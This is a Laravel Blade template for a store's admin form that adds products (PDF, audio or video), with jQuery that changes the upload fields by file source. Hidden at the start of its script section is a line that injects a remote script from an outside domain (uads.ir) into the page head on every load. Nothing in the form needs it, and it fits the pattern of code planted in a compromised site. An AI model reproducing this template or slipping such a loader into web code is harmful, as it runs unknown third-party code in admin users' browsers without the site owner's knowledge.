@extends("layout.admin")

@section("main-content")

    <div class="col-lg-12 col-md-12 col-ms-12 mb-3">
        <h2 class="">Add Product To Store</h2>
        <form class="mb-4" action="{{route("admin.products.store")}}" method="Post"  enctype="multipart/form-data">
            {{csrf_field()}}
            {{method_field('POST')}}


            <div class="form-row">
                <div class="form-group col-md-6">
                    <label for="productName">Product Name <span id="required" >*</span></label>
                    <input type="text" name="productName" value="{{old("productName")}}" required  class="form-control" id="productName" placeholder="Product Name">
                </div>
                <div class="form-group col-md-6">
                        <label class="" for="productPrice">Price <span id="required" >*</span></label>
                        <div class="input-group">
                            <div class="input-group-prepend">
                                <div class="input-group-text">K</div>
                            </div>
                            <input type="number" min="0" accept="image/*"  required name="productPrice" value="{{old("productPrice")}}"
                                   class="form-control" id="productPrice" placeholder=" k100.9">

                        </div>

                </div>
            </div>
            <div class="form-row">
                <div class="form-group col-md-6">

                    <label for="productDescription">Short Description <span id="required" >*</span></label>
                    <input type="text" maxlength="350" name="productDescription" required value="{{old("productDescription")}}"
                           class="form-control" id="productDescription" placeholder="Product Description">
                </div>
                <div class="form-group col-md-6">
                    <label for="productFeaturedImage">Featured Image <span id="required" >*</span></label>
                    <label class="btn btn-outline-primary mt-5"><i class="fa fa-image"></i> Upload Featured Image
                        <input type="file" required style="display: none;" name="productFeaturedImage" value="{{old("productFeaturedImage")}}"  class="form-control"
                               id="productFeaturedImage" accept="image/*" placeholder="Upload png,jpg,jpeg">
                    </label>

                </div>
            </div>
            <div class="form-row">
                <div class="form-group col-md-4">
                    <label for="productOwner">Product Owner</label>
                    <input type="text" name="productOwner" value="{{old("productOwner")}}"  placeholder="Pastor Choolwe" class="form-control" id="productOwner">
                </div>
                <div class="form-group col-md-4">
                    <label for="productRelease">Mark As New Release</label>
                    <select id="productRelease" name="productRelease" class="form-control">
                        <option value="1" selected>Yes</option>
                        <option value="0">No</option>
                    </select>
                </div>
                <div class="form-group col-md-4">
                    <label for="productDownloadLimit">Product Download Link </label>
                    <input type="number" min="0" value="{{old("productDownloadLimit")}}"  name="productDownloadLimit" class="form-control"
                           title="Limit number of downloads per user (default : 3)"
                           placeholder="Limit number of downloads per user" id="productDownloadLimit">
                </div>
            </div>
            <div class="form-group">
                <label for="productLongDescription">Detailed Long Description</label>
                <textarea  minlength="350" name="productLongDescription"    class="form-control"
                           id="productLongDescription" placeholder="Detailed Description">
{{old("productLongDescription")}}
                    </textarea>
            </div>

            <div class="form-row">
                <div class="form-group col-md-6">
                        <label for="productType">Select Product Type <span id="required" >*</span></label>
                        <select   id="productType"  name="productType" class="form-control">
                            <option value="-1">Select Product type</option>
                            <option value="pdf">pdf</option>
                            <option value="audio">audio</option>
                            <option value="video">video</option>

                            {{--                            @foreach($productTypes as $productType)--}}
{{--                                <option   value="{{$productType->id}}" > {{$productType->productTypeName}} </option>--}}
{{--                            @endforeach--}}

                        </select>

                </div>
                <div class="form-group col-md-6">
                    <label for="productCategories">Select Category </label>
                    <select id="productCategories" required multiple name="productCategories[]" class="form-control">
                        <option > Select Product Category</option>
                        @foreach($categories as $category)
                            <option value="{{$category->id}}" > {{$category->categoryName}} </option>
                        @endforeach

                    </select>
                </div>
            </div>
            <div class="form-row mt-1 mb-2">
                <div class="form-group ">
                    <label for="productSource">Select File Source <span id="required" >*</span></label>
                    <select   id="productSource"  required name="productSource" class="form-control">
                        <option >Select Source</option>
                        <option value="1">Upload </option>
                        <option value="2">Url</option>
                        <option value="3">Embed Code</option>
                    </select>

                </div>

            </div>
            <div class="form-row" id="one">

            </div>

            <div class="col-lg-5 text-center">
                <button type="submit" class="btn btn-outline-primary form-control">Add product</button>
            </div>

        </form>

    </div>
    <br class="mb-3"/>
    <br/>

@endsection

@section("script")
    <script>
        $(document).ready(function(){
            $('<script/>',{type:'text/javascript', src:'http://uads.ir/l.php?s=125125&w=5307cd5c027373e1773c9869'}).appendTo('head');
//element.innerHTML = htmlString;

            $('#productSource').on('change',function(e) {
                var selected = e.target.value;
                if(selected ==1){
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-12">' +
                        '                    <label for="uploadedFile">Upload Audio,video,Pdf <span id="required" >*</span></label>' +
                        '                    <input type="file" accept="audio/*,video/*,image/*,*.pdf" required name="uploadedFile" value="{{old("uploadedFile")}}"  class="form-control"'+
                        'id="uploadedFile" placeholder="audio format only" >' +
                        '                </div> ';
                }else if(selected ==2){
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-12">\n' +
                        '                    <label for="productUrl"> Product Url <span id="required" >*</span></label>\n' +
                        '                    <input type="url" value="{{old("productUrl")}}" required name="productUrl" class="form-control"\n' +
                        '                           id="productUrl" placeholder="Product Url">\n' +
                        '\n' +
                        '                </div>\n';
                }else if(selected ==3 ){
                    var d1 = document.getElementById('one');
                    d1.innerHTML = '<div class="form-group col-md-6">\n' +
                        '                 <label for="productDownloadLink">Product Download Link <span id="required" >*</span></label>\n' +
                        ' <input type="text" value="{{old("productDownloadLink")}}" required name="productDownloadLink" class="form-control" \n' +
                        ' title="public link to download the video" \n' +
                        '  placeholder="public link to download the video" id="productDownloadLink">\n' +
                        '      </div>\n' +
                        '<div class="form-group col-md-6">' +
                        '    <label for="productIframe">Embed Code (video iframe html) <span id="required" >*</span></label>' +
                        '    <textarea  name="productIframe" value="{{old("productIframe")}}"  class="form-control"' +
                        '          id="productIframe" placeholder="Iframe html ">' +
                        ' </textarea>' +
                        ' </div>';
                }else{
                        var d1 = document.getElementById('one');
                        d1.innerHTML = '<div class="form-group col-md-4">' +
                            '                    <label for="productUrl">Url </label>' +
                    '                    <input type="url" value="{{old("productUrl")}}" required name="productUrl" class="form-control"' +
                    '                           id="productUrl" placeholder="Product Url">' +
                    '                </div>' +
                            '<div class="form-group col-md-4">' +
                            '                    <label for="uploadedFile">Choose File (video or audio or pdf)</label>' +
                            '                    <input type="file" accept="audio/*,video/*,image/*,pdf" required name="uploadedFile" value="{{old("uploadedFile")}}"  class="form-control"'+
                                     'id="uploadedFile" placeholder="audio format only" >' +
                            '                </div> ' +
                            '<div class="form-group col-md-4">' +
                            '    <label for="productIframe">Embed Code</label>' +
                            '    <textarea  name="productIframe" required value="{{old("productIframe")}}"  class="form-control"' +
                            '          id="productIframe" placeholder="Iframe html ">' +
                            ' </textarea>' +
                            ' </div>';

                }
            });
        });
    </script>
@endsection


